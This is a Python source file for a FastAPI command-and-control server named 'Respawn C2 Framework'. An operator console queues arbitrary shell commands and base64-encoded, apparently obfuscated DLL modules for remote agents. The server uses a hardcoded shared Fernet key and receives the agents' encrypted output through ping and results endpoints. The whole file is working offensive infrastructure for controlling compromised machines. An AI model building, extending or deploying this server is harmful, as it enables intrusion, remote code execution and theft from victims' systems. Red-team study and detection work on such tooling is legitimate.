import asyncio
import base64
import json
import os
from fastapi import FastAPI, Request, Response
from cryptography.fernet import Fernet
import uvicorn

app = FastAPI(title="Respawn C2 Framework", version="1.0.0")

# Shared key matching the agent
SHARED_KEY = b'rsO4pmoeWw12PE49hAlBh3uXBOBRJe5hcdIgiPblXUk=' 
cipher = Fernet(SHARED_KEY)

command_queue = asyncio.Queue()
DLL_FOLDER = "./ConfuserEx_DLLs"

async def operator_cli():
    """Simulate an operator console to queue new commands asynchronously."""
    await asyncio.sleep(1)
    print("\n" + "="*40)
    print("      FASTAPI C2 CONTROLLER ONLINE      ")
    print("="*40)
    
    while True:
        loop = asyncio.get_event_loop()
        cmd = await loop.run_in_executor(None, input, "\n[C2 Console] Enter command: ")
        cmd = cmd.strip()
        
        if not cmd:
            continue

        parts = cmd.split(" ")

        # 1. Local Operator Command: R2 List / R2 list
        if len(parts) >= 2 and parts[0] == "R2" and parts[1].lower() == "list":
            if os.path.exists(DLL_FOLDER):
                dlls = sorted([f for f in os.listdir(DLL_FOLDER) if f.lower().endswith(".dll")], key=str.lower)
                print(f"\n[+] Available Modules in {DLL_FOLDER}/:")
                if dlls:
                    for idx, dll in enumerate(dlls, 1):
                        size_kb = os.path.getsize(os.path.join(DLL_FOLDER, dll)) / 1024
                        print(f"    {idx}. {dll:<25} ({size_kb:.1f} KB)")
                else:
                    print("    [-] No .dll files found in directory.")
            else:
                print(f"[-] Error: Directory '{DLL_FOLDER}' does not exist.")
            continue

        # 2. Remote Agent Tasking: R2 <dll_name> [target_method] [args...]
        elif parts[0] == "R2" and len(parts) >= 2:
            dll_prefix = parts[1]
            
            # If ONLY "R2 <dll>" is entered, default target_method to "Info"
            if len(parts) == 2:
                target_method = "Info"
                extra_args = []
            else:
                target_method = parts[2]
                extra_args = parts[3:]
            
            dll_filename = dll_prefix if dll_prefix.endswith(".dll") else f"{dll_prefix}.dll"
            dll_path = os.path.join(DLL_FOLDER, dll_filename)

            if os.path.exists(dll_path):
                with open(dll_path, "rb") as f:
                    dll_bytes = f.read()

                task_data = {
                    "type": "R2_EXEC",
                    "dll_name": dll_filename,
                    "target_method": target_method,
                    "args": extra_args,
                    "dll_b64": base64.b64encode(dll_bytes).decode('utf-8')
                }

                await command_queue.put(json.dumps(task_data))
                print(f"[*] Task Queued -> DLL: '{dll_filename}' | Method: '{target_method}()' | Args: {extra_args}")
            else:
                print(f"[-] Error: '{dll_filename}' not found in {DLL_FOLDER}/")

        # 3. Standard OS Shell Commands
        else:
            await command_queue.put(cmd)
            print(f"[*] Command '{cmd}' queued successfully.")
            
@app.get("/api/v1/ping")
async def agent_checkin():
    cmd_to_send = ""
    if not command_queue.empty():
        cmd_to_send = await command_queue.get()
    
    encrypted_cmd = cipher.encrypt(cmd_to_send.encode())
    return Response(content=encrypted_cmd, media_type="application/octet-stream")

@app.post("/api/v1/results")
async def receive_results(request: Request):
    try:
        encrypted_data = await request.body()
        decrypted_output = cipher.decrypt(encrypted_data).decode('utf-8', errors='ignore')
        
        print(f"\n[+] Agent output received:\n{decrypted_output}")
        return {"status": "success"}
        
    except Exception as e:
        return Response(content=f"Error: {str(e)}", status_code=400)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(operator_cli())

if __name__ == '__main__':
    uvicorn.run("server:app", host="0.0.0.0", port=5000, log_level="warning")